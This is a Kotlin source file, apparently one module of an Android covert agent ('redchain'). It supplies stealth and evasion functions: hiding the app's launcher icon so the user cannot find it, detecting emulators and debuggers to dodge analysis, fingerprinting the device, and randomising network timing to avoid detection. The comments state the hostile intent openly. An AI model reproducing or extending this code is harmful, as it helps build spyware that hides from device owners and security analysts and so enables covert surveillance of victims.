package com.redchain.agent.modules

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import org.json.JSONObject

/**
 * Stealth and evasion techniques
 * Hide from user detection
 */
object StealthModule {

    /**
     * Hide app icon from launcher
     * User can't easily find the app
     */
    fun hideAppIcon(context: Context) {
        val packageManager = context.packageManager
        val componentName = android.content.ComponentName(
            context,
            "com.redchain.agent.MainActivity"
        )

        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * Show app icon (for debugging)
     */
    fun showAppIcon(context: Context) {
        val packageManager = context.packageManager
        val componentName = android.content.ComponentName(
            context,
            "com.redchain.agent.MainActivity"
        )

        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * Check if running in emulator (anti-analysis)
     */
    fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT)
    }

    /**
     * Check if debugger attached
     */
    fun isDebuggerConnected(): Boolean {
        return android.os.Debug.isDebuggerConnected()
    }

    /**
     * Get device info for fingerprinting
     */
    fun getDeviceFingerprint(): JSONObject {
        return JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("fingerprint", Build.FINGERPRINT)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("is_emulator", isEmulator())
        }
    }

    /**
     * Randomize network request timing to avoid pattern detection
     */
    fun getRandomDelay(): Long {
        // Random delay between 5-15 seconds
        return (5000L..15000L).random()
    }
}
